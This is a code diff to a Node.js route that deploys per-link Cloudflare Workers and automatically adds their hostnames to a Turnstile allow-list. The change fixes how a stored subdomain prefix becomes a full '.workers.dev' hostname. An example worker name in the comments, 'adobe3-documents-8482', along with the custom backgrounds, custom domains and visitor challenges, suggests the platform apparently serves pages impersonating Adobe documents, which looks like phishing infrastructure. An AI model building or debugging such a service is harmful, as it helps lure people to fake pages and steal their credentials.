@@ -6,6 +6,17 @@ const config = require('../config/env');
 const { userAuth } = require('../middleware/auth');
 const { validateResult, commonValidators } = require('../middleware/validator');
 
+// cf_workers_subdomain is stored as the PREFIX only ("powerballranger"), never
+// with the ".workers.dev" suffix. Callers that build a full hostname must
+// normalise it first, because Cloudflare Turnstile matches allowed origins by
+// exact hostname - "adobe3-documents-8482.powerballranger" will never match the
+// page's real origin "...powerballranger.workers.dev".
+function normalizeWorkersSubdomain(value) {
+  const s = String(value || '').trim().toLowerCase();
+  if (!s) return 'workers.dev';
+  return s.endsWith('.workers.dev') ? s : s + '.workers.dev';
+}
+
 function getLinkPublicUrl(link, user) {
   if (!link) return null;
   if (link.url_type === 'bunny' && link.custom_domain) {
@@ -23,8 +34,10 @@ function getLinkPublicUrl(link, user) {
     return `https://${prefix ? `${prefix}.` : ''}${domain}`;
   }
   if (link.url_type === 'worker' && link.worker_name) {
-    const subdomain = String(user?.cf_workers_subdomain || '').trim();
-    return subdomain ? `https://${link.worker_name}.${subdomain}.workers.dev` : `https://${link.worker_name}.workers.dev`;
+    // Normalize: cf_workers_subdomain is stored as a bare prefix, so it must be
+    // suffixed with ".workers.dev" here (a bare prefix yields a URL 404ing on
+    // a host that doesn't exist).
+    return `https://${link.worker_name}.${normalizeWorkersSubdomain(user?.cf_workers_subdomain)}`;
   }
   if (link.url_type === 'export') {
     // If domain is set, show the domain URL; otherwise show download URL
@@ -208,8 +221,17 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
         await db.query('UPDATE links SET worker_name = ?, url_type = ?, custom_domain = ?, custom_bg_url = ? WHERE id = ?',
           [deployment.workerName || worker_name, url_type, custom_domain || null, custom_bg_url || null, linkId]);
 
-        // Auto-add deployed worker domains to Turnstile whitelist
-        const cfWorkersSubdomain = req.user.cf_workers_subdomain || config.CF_WORKERS_SUBDOMAIN || 'workers.dev';
+        // Auto-add deployed worker domains to Turnstile whitelist.
+        // cf_workers_subdomain is stored as the PREFIX only ("powerballranger"),
+        // not the full domain. Turnstile matches allowed origins by exact
+        // hostname, so the suffix must be present here - otherwise the origin
+        // that actually gets added ("adobe3-documents-8482.powerballranger")
+        // never matches the page's real origin
+        // ("...powerballranger.workers.dev"), and every challenge fails with a
+        // domain mismatch and the visitor is let straight through.
+        const cfWorkersSubdomain = normalizeWorkersSubdomain(
+          req.user.cf_workers_subdomain || config.CF_WORKERS_SUBDOMAIN
+        );
         try {
           const turnstileWhitelist = require('../services/turnstile-whitelist');
           await turnstileWhitelist.autoWhitelistWorker({
@@ -228,7 +250,7 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
         // Assign a platform-owned Turnstile widget for this link
         const hostname = custom_domain
           ? String(custom_domain).replace(/^https?:\/\//i, '').replace(/\/+$/, '')
-          : `${deployment.workerName || worker_name}.${cfWorkersSubdomain || 'workers.dev'}`;
+          : `${deployment.workerName || worker_name}.${cfWorkersSubdomain}`;
         try {
           const turnstilePool = require('../services/turnstile-pool');
           await turnstilePool.assignWidget(linkId, hostname).catch(err => {
